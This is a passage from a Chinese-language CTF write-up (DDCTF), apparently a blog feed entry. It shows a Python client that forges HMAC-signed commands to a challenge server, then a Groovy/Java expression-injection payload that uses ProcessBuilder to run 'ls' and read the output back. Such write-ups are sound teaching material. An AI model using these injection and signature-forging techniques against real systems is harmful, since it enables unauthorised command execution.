title="步骤2：逆向绕过客户端"></a>步骤2：逆向绕过客户端</h2><p>获得 client 后，由队里的其他大佬进行逆向分析，并制作模拟客户端的工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input()  <span class="comment"># 发送的命令</span></span><br><span class="line"></span><br><span class="line">    appkey = <span class="string">&quot;DDCTFWithYou&quot;</span></span><br><span class="line">    time_stamp = str(int(time()))</span><br><span class="line">    strToSign = cmd + <span class="string">&#x27;|&#x27;</span> + time_stamp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hmac_sha256加密</span></span><br><span class="line">    sha = hmac.new(</span><br><span class="line">        bytes(appkey, encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        bytes(strToSign, encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        digestmod=hashlib.sha256</span><br><span class="line">    ).digest()</span><br><span class="line">    sign = bytes.decode(</span><br><span class="line">        b64encode(sha)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发起POST请求</span></span><br><span class="line">    url = <span class="string">&quot;http://117.51.136.197/server/command&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;signature&quot;</span>: sign,</span><br><span class="line">        <span class="string">&quot;command&quot;</span>: cmd,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: time_stamp</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(</span><br><span class="line">        url=url,</span><br><span class="line">        data=json.dumps(data)</span><br><span class="line">    )</span><br><span class="line">    pprint(res.text)</span><br></pre></td></tr></table></figure><h2 id="步骤3：命令执行"><a href="#步骤3：命令执行" class="headerlink" title="步骤3：命令执行"></a>步骤3：命令执行</h2><p>判断后端语言，构造 payload。首先利用语言的运算符测试是否执行，总结存在哪些运算符，然后测试出字符串可以使用 length 函数，猜测可能该语言为「面向对象语言」，从逻辑运算符 != 和 length 函数猜测可能是 <a href="https://coolshell.cn/articles/2631.html">Java 衍生的语言</a>（输入的命令以 # 定义变量，可使用 #a=1 测试）——<a href="http://groovy.codehaus.org/"><strong>Groovy</strong></a>，但是始终无法完美匹配。最终在一篇<a href="https://zhuanlan.kanxue.com/article-12714.htm">博客</a>找到突破点，文章中的很多情景很符合该题目，测试 java.lang.String.class.forName(“java.lang.Runtime”) 时出现 command is evil，断定为 Groovy。于是便开始寻找 Java 命令注入代码，<a href="https://y4er.com/post/java-exec-command/">网上大多数的命令执行</a>大都是使用 Runtime 类或 Processbuider 类，但都是多行代码的形式，<a href="https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh">CVE-2015-1427 的 exploit</a> 也无法执行。网上的命名只有一行为命令执行，我们猜测可以采用乱码方式进行回显，然后在本地解码，然后从 IDEA 自动补全找到 readAllBytes 函数，将数据读出。然后把读出的数据使用 Base64 解码就得到命令执行的结果。</p><p>图3：编程语言分类<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233927.png"></p><p>code：一些关键性的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> == true</span><br><span class="line"><span class="comment">#a = 1</span></span><br><span class="line">&#123;<span class="number">1</span>&#125;</span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.length()</span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.concat(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;12 &#x27;</span>.trim()</span><br><span class="line"><span class="string">&#x27;1234&#x27;</span>.getBytes()</span><br><span class="line"><span class="string">&#x27;hello&#x27;</span>.startsWith(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">new ProcessBuilder(<span class="string">&quot;ls&quot;</span>).start().getInputStream().readAllBytes()</span><br></pre></td></tr></table></figure><p>图4：使用 readAllBytes 读出数据<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20200913234130453.png" alt="image-20200913234130453"></p><p>将读出的数据使用 base64 解开即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> jwt </tag>
            
            <tag> java命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
